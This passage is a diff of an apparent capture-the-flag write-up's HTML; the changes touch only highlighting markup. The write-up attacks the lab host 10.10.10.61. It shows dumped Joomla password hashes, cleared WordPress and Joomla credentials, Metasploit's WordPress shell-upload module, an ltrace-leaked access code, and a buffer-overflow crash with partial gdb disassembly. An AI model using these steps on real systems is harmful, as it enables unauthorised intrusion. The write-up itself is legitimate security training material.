+</span></span></span><span class="line"><span class="cl"><span class="go">400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
+</span></span></span><span class="line"><span class="cl"><span class="go">401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00
+</span></span></span></code></pre></div></div></p>
 
 <p>Nice, we have found the credentials geordi.la.forge:ZD3YxfnSjezg67JZ for <a href="http://10.10.10.61:8080/administrator" target="_blank">http://10.10.10.61:8080/administrator</a></p>
 
@@ -676,21 +676,21 @@ Plugin Name: lcars
 <h2 id="getting-shell-on-wordpress-container">Getting shell on Wordpress container</h2>
 
 <p>We can get a shell on the wordpress container by editing or uploading plugins. You can do it via the web portal or metasploit etc:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
-</span><span class="go">msf exploit(wp_admin_shell_upload) &gt; info
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Basic options:
-</span><span class="go">  Name       Current Setting     Required  Description
-</span><span class="go">  ----       ---------------     --------  -----------
-</span><span class="go">  PASSWORD   u*Z14ru0p#ttj83zS6  yes       The WordPress password to authenticate with
-</span><span class="go">  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
-</span><span class="go">  RHOST      10.10.10.61         yes       The target address
-</span><span class="go">  RPORT      80                  yes       The target port (TCP)
-</span><span class="go">  SSL        false               no        Negotiate SSL/TLS for outgoing connections
-</span><span class="go">  TARGETURI  /                   yes       The base path to the wordpress application
-</span><span class="go">  USERNAME   william.riker       yes       The WordPress username to authenticate with
-</span><span class="go">  VHOST                          no        HTTP server virtual host
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(wp_admin_shell_upload) &gt; info
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Basic options:
+</span></span></span><span class="line"><span class="cl"><span class="go">  Name       Current Setting     Required  Description
+</span></span></span><span class="line"><span class="cl"><span class="go">  ----       ---------------     --------  -----------
+</span></span></span><span class="line"><span class="cl"><span class="go">  PASSWORD   u*Z14ru0p#ttj83zS6  yes       The WordPress password to authenticate with
+</span></span></span><span class="line"><span class="cl"><span class="go">  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+</span></span></span><span class="line"><span class="cl"><span class="go">  RHOST      10.10.10.61         yes       The target address
+</span></span></span><span class="line"><span class="cl"><span class="go">  RPORT      80                  yes       The target port (TCP)
+</span></span></span><span class="line"><span class="cl"><span class="go">  SSL        false               no        Negotiate SSL/TLS for outgoing connections
+</span></span></span><span class="line"><span class="cl"><span class="go">  TARGETURI  /                   yes       The base path to the wordpress application
+</span></span></span><span class="line"><span class="cl"><span class="go">  USERNAME   william.riker       yes       The WordPress username to authenticate with
+</span></span></span><span class="line"><span class="cl"><span class="go">  VHOST                          no        HTTP server virtual host
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="getting-shell-on-joomla-container">Getting shell on Joomla container</h2>
 
@@ -706,284 +706,284 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
 <h2 id="getting-root">Getting root</h2>
 
 <p>Port 32812 gave some interesting output on nmap scanning. Let&rsquo;s use nc to check it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>nc 10.10.10.61 <span class="m">32812</span>
-<span class="go">nc: using stream socket
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">                 _______ _______  ______ _______
-</span><span class="go">          |      |       |_____| |_____/ |______
-</span><span class="go">          |_____ |_____  |     | |    \_ ______|
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Enter Bridge Access Code:
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc 10.10.10.61 <span class="m">32812</span>
+</span></span><span class="line"><span class="cl"><span class="go">nc: using stream socket
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">                 _______ _______  ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">          |      |       |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">          |_____ |_____  |     | |    \_ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Enter Bridge Access Code:
+</span></span></span></code></pre></div></div></p>
 
 <p>Unfortunately we don&rsquo;t know the code. But now we have a shell. Let&rsquo;s see what is binding on port 32812
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>netstat -lntup <span class="p">|</span> grep <span class="m">32812</span>
-<span class="go">tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> netstat -lntup <span class="p">|</span> grep <span class="m">32812</span>
+</span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd
+</span></span></span></code></pre></div></div></p>
 
 <p>The xinetd daemon listens for incoming requests over a network and launches the appropriate service. Let&rsquo;s find what that service is:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>pstree
-<span class="go">systemd-+-VGAuthService
-</span><span class="go">        |-accounts-daemon-+-{gdbus}
-</span><span class="go">        |                 `-{gmain}
-</span><span class="go">        |-acpid
-</span><span class="go">        |-agetty
-</span><span class="go">        |-apache2---15*[apache2]
-</span><span class="go">        |-atd
-</span><span class="go">        |-cron
-</span><span class="go">        |-dbus-daemon
-</span><span class="go">        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---37*[{mysqld}]
-</span><span class="go">        |         |                 |                 `-9*[{docker-containe}]
-</span><span class="go">        |         |                 |-docker-containe-+-apache2---10*[apache2]
-</span><span class="go">        |         |                 |                 `-8*[{docker-containe}]
-</span><span class="go">        |         |                 |-docker-containe-+-apache2-+-2*[apache2-sh-php-{msf}]
-</span><span class="go">        |         |                 |                 |         `-10*[apache2]
-</span><span class="go">        |         |                 |                 `-9*[{docker-containe}]
-</span><span class="go">        |         |                 `-13*[{docker-containe}]
-</span><span class="go">        |         |-docker-proxy---4*[{docker-proxy}]
-</span><span class="go">        |         |-docker-proxy---3*[{docker-proxy}]
-</span><span class="go">        |         `-16*[{dockerd}]
-</span><span class="go">        |-irqbalance
-</span><span class="go">        |-2*[iscsid]
-</span><span class="go">        |-lvmetad
-</span><span class="go">        |-lxcfs---2*[{lxcfs}]
-</span><span class="go">        |-polkitd-+-{gdbus}
-</span><span class="go">        |         `-{gmain}
-</span><span class="go">        |-rsyslogd-+-{in:imklog}
-</span><span class="go">        |          |-{in:imuxsock}
-</span><span class="go">        |          `-{rs:main Q:Reg}
-</span><span class="go">        |-snapd---7*[{snapd}]
-</span><span class="go">        |-sshd
-</span><span class="go">        |-systemd---(sd-pam)
-</span><span class="go">        |-systemd-journal
-</span><span class="go">        |-systemd-logind
-</span><span class="go">        |-systemd-resolve
-</span><span class="go">        |-systemd-timesyn---{sd-resolve}
-</span><span class="go">        |-systemd-udevd
-</span><span class="go">        |-vmtoolsd---{gmain}
-</span><span class="go">        `-xinetd---lcars
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pstree
+</span></span><span class="line"><span class="cl"><span class="go">systemd-+-VGAuthService
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-accounts-daemon-+-{gdbus}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |                 `-{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-acpid
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-agetty
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-apache2---15*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-atd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-cron
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-dbus-daemon
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---37*[{mysqld}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-9*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |-docker-containe-+-apache2---10*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-8*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |-docker-containe-+-apache2-+-2*[apache2-sh-php-{msf}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 |         `-10*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-9*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 `-13*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |-docker-proxy---4*[{docker-proxy}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |-docker-proxy---3*[{docker-proxy}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         `-16*[{dockerd}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-irqbalance
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-2*[iscsid]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-lvmetad
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-lxcfs---2*[{lxcfs}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-polkitd-+-{gdbus}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         `-{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-rsyslogd-+-{in:imklog}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |          |-{in:imuxsock}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |          `-{rs:main Q:Reg}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-snapd---7*[{snapd}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-sshd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd---(sd-pam)
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-journal
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-logind
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-resolve
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-timesyn---{sd-resolve}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-udevd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-vmtoolsd---{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        `-xinetd---lcars
+</span></span></span></code></pre></div></div></p>
 
 <p>Well, the service is named &ldquo;lcars&rdquo;:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>which lcars
-<span class="go">/bin/lcars
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> which lcars
+</span></span><span class="line"><span class="cl"><span class="go">/bin/lcars
+</span></span></span></code></pre></div></div></p>
 
 <p>Using ltrace we discover the access code for lcars:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>ltrace /bin/lcars
-<span class="go">...
-</span><span class="go">strcmp(&#34;somedummyinput\n&#34;, &#34;picarda1&#34;)                    = -1
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ltrace /bin/lcars
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;somedummyinput\n&#34;, &#34;picarda1&#34;)                    = -1
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>If we explore a little the lcars app, we discover that there is a segmentation fault / buffer overflow:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Enter Bridge Access Code:
-</span><span class="go">picarda1
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">LCARS Bridge Secondary Controls -- Main Menu: 
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">1. Navigation
-</span><span class="go">2. Ships Log
-</span><span class="go">3. Science
-</span><span class="go">4. Security
-</span><span class="go">5. StellaCartography
-</span><span class="go">6. Engineering
-</span><span class="go">7. Exit
-</span><span class="go">Waiting for input: 
-</span><span class="go">4
-</span><span class="go">Disable Security Force Fields
-</span><span class="go">Enter Security Override:
-</span><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-</span><span class="go">Segmentation fault
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Enter Bridge Access Code:
+</span></span></span><span class="line"><span class="cl"><span class="go">picarda1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">LCARS Bridge Secondary Controls -- Main Menu: 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">1. Navigation
+</span></span></span><span class="line"><span class="cl"><span class="go">2. Ships Log
+</span></span></span><span class="line"><span class="cl"><span class="go">3. Science
+</span></span></span><span class="line"><span class="cl"><span class="go">4. Security
+</span></span></span><span class="line"><span class="cl"><span class="go">5. StellaCartography
+</span></span></span><span class="line"><span class="cl"><span class="go">6. Engineering
+</span></span></span><span class="line"><span class="cl"><span class="go">7. Exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Waiting for input: 
+</span></span></span><span class="line"><span class="cl"><span class="go">4
+</span></span></span><span class="line"><span class="cl"><span class="go">Disable Security Force Fields
+</span></span></span><span class="line"><span class="cl"><span class="go">Enter Security Override:
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="go">Segmentation fault
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s find more about this using gdb:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>gdb /bin/lcars
-<span class="err">
-</span><span class="err"></span><span class="go">(gdb) $ info functions
-</span><span class="go">All defined functions:
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Non-debugging symbols:
-</span><span class="go">0x00000508  _init
-</span><span class="go">0x00000540  strcmp@plt
-</span><span class="go">0x00000550  setresuid@plt
-</span><span class="go">0x00000560  printf@plt
-</span><span class="go">0x00000570  fflush@plt
-</span><span class="go">0x00000580  fgets@plt
-</span><span class="go">0x00000590  puts@plt
-</span><span class="go">0x000005a0  exit@plt
-</span><span class="go">0x000005b0  __libc_start_main@plt
-</span><span class="go">0x000005c0  __isoc99_scanf@plt
-</span><span class="go">0x000005e0  _start
-</span><span class="go">0x00000620  __x86.get_pc_thunk.bx
-</span><span class="go">0x00000630  deregister_tm_clones
-</span><span class="go">0x00000670  register_tm_clones
-</span><span class="go">0x000006c0  __do_global_dtors_aux
-</span><span class="go">0x00000710  frame_dummy
-</span><span class="go">0x0000074c  __x86.get_pc_thunk.dx
-</span><span class="go">0x00000750  startScreen
-</span><span class="go">0x000007d4  disableForcefields
-</span><span class="go">0x0000085e  main_menu
-</span><span class="go">0x00000b6a  unable
-</span><span class="go">0x00000ba8  bridgeAuth
-</span><span class="go">0x00000c91  main
-</span><span class="go">0x00000d30  __libc_csu_init
-</span><span class="go">0x00000d90  __libc_csu_fini
-</span><span class="go">0x00000d94  _fini
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gdb /bin/lcars
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(gdb) $ info functions
+</span></span></span><span class="line"><span class="cl"><span class="go">All defined functions:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Non-debugging symbols:
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000508  _init
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000540  strcmp@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000550  setresuid@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000560  printf@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000570  fflush@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000580  fgets@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000590  puts@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005a0  exit@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005b0  __libc_start_main@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005c0  __isoc99_scanf@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005e0  _start
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000620  __x86.get_pc_thunk.bx
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000630  deregister_tm_clones
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000670  register_tm_clones
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000006c0  __do_global_dtors_aux
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000710  frame_dummy
+</span></span></span><span class="line"><span class="cl"><span class="go">0x0000074c  __x86.get_pc_thunk.dx
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000750  startScreen
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000007d4  disableForcefields
+</span></span></span><span class="line"><span class="cl"><span class="go">0x0000085e  main_menu
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000b6a  unable
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000ba8  bridgeAuth
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000c91  main
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d30  __libc_csu_init
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d90  __libc_csu_fini
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d94  _fini
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s have a look inside the function disableForcefields:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">(gdb) $ set disassembly-flavor intel
-</span><span class="go">(gdb) $ disass disableForcefields
-</span><span class="go">Dump of assembler code for function disableForcefields:
-</span><span class="go">   0x000007d4 &lt;+0&gt;:    push   ebp
-</span><span class="go">   0x000007d5 &lt;+1&gt;:    mov    ebp,esp
-</span><span class="go">   0x000007d7 &lt;+3&gt;:    push   ebx
-</span><span class="go">   0x000007d8 &lt;+4&gt;:    sub    esp,0xd4
-</span><span class="go">   0x000007de &lt;+10&gt;:    call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
-</span><span class="go">   0x000007e3 &lt;+15&gt;:    add    ebx,0x281d
-</span><span class="go">   0x000007e9 &lt;+21&gt;:    call   0x750 &lt;startScreen&gt;
-</span><span class="go">   0x000007ee &lt;+26&gt;:    sub    esp,0xc
-</span><span class="go">   0x000007f1 &lt;+29&gt;:    lea    eax,[ebx-0x2173]
-</span><span class="go">   0x000007f7 &lt;+35&gt;:    push   eax
-</span><span class="go">   0x000007f8 &lt;+36&gt;:    call   0x590 &lt;puts@plt&gt;
-</span><span class="go">   0x000007fd &lt;+41&gt;:    add    esp,0x10
-</span><span class="go">   0x00000800 &lt;+44&gt;:    sub    esp,0xc
-</span><span class="go">   0x00000803 &lt;+47&gt;:    lea    eax,[ebx-0x2155]
-</span><span class="go">   0x00000809 &lt;+53&gt;:    push   eax
-</span><span class="go">   0x0000080a &lt;+54&gt;:    call   0x590 &lt;puts@plt&gt;
-</span><span class="go">   0x0000080f &lt;+59&gt;:    add    esp,0x10
-</span><span class="go">   0x00000812 &lt;+62&gt;:    mov    eax,DWORD PTR [ebx-0x10]
-</span><span class="go">   0x00000818 &lt;+68&gt;:    mov    eax,DWORD PTR [eax]
-</span><span class="go">   0x0000081a &lt;+70&gt;:    sub    esp,0xc
-</span><span class="go">   0x0000081d &lt;+73&gt;:    push   eax
-</span><span class="go">   0x0000081e &lt;+74&gt;:    call   0x570 &lt;fflush@plt&gt;
-</span><span class="go">   0x00000823 &lt;+79&gt;:    add    esp,0x10
-</span><span class="go">   0x00000826 &lt;+82&gt;:    sub    esp,0x8
-</span><span class="go">   0x00000829 &lt;+85&gt;:    lea    eax,[ebp-0xd0]
-</span><span class="go">   0x0000082f &lt;+91&gt;:    push   eax
-</span><span class="go">   0x00000830 &lt;+92&gt;:    lea    eax,[ebx-0x213c]
-</span><span class="go">   0x00000836 &lt;+98&gt;:    push   eax
-</span><span class="go">   0x00000837 &lt;+99&gt;:    call   0x5c0 &lt;__isoc99_scanf@plt&gt;
-</span><span class="go">   0x0000083c &lt;+104&gt;:    add    esp,0x10
-</span><span class="go">   0x0000083f &lt;+107&gt;:    sub    esp,0x8
-</span><span class="go">   0x00000842 &lt;+110&gt;:    lea    eax,[ebp-0xd0]
-</span><span class="go">   0x00000848 &lt;+116&gt;:    push   eax
-</span><span class="go">   0x00000849 &lt;+117&gt;:    lea    eax,[ebx-0x2138]
-</span><span class="go">   0x0000084f &lt;+123&gt;:    push   eax
-</span><span class="go">   0x00000850 &lt;+124&gt;:    call   0x560 &lt;printf@plt&gt;
-</span><span class="go">   0x00000855 &lt;+129&gt;:    add    esp,0x10
-</span><span class="go">   0x00000858 &lt;+132&gt;:    nop
-</span><span class="go">   0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
-</span><span class="go">   0x0000085c &lt;+136&gt;:    leave  
-</span><span class="go">   0x0000085d &lt;+137&gt;:    ret    
-</span><span class="go">End of assembler dump.
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(gdb) $ set disassembly-flavor intel
+</span></span></span><span class="line"><span class="cl"><span class="go">(gdb) $ disass disableForcefields
+</span></span></span><span class="line"><span class="cl"><span class="go">Dump of assembler code for function disableForcefields:
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d4 &lt;+0&gt;:    push   ebp
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d5 &lt;+1&gt;:    mov    ebp,esp
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d7 &lt;+3&gt;:    push   ebx
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d8 &lt;+4&gt;:    sub    esp,0xd4
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007de &lt;+10&gt;:    call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007e3 &lt;+15&gt;:    add    ebx,0x281d
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007e9 &lt;+21&gt;:    call   0x750 &lt;startScreen&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007ee &lt;+26&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f1 &lt;+29&gt;:    lea    eax,[ebx-0x2173]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f7 &lt;+35&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f8 &lt;+36&gt;:    call   0x590 &lt;puts@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007fd &lt;+41&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000800 &lt;+44&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000803 &lt;+47&gt;:    lea    eax,[ebx-0x2155]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000809 &lt;+53&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000080a &lt;+54&gt;:    call   0x590 &lt;puts@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000080f &lt;+59&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000812 &lt;+62&gt;:    mov    eax,DWORD PTR [ebx-0x10]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000818 &lt;+68&gt;:    mov    eax,DWORD PTR [eax]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081a &lt;+70&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081d &lt;+73&gt;:    push   eax
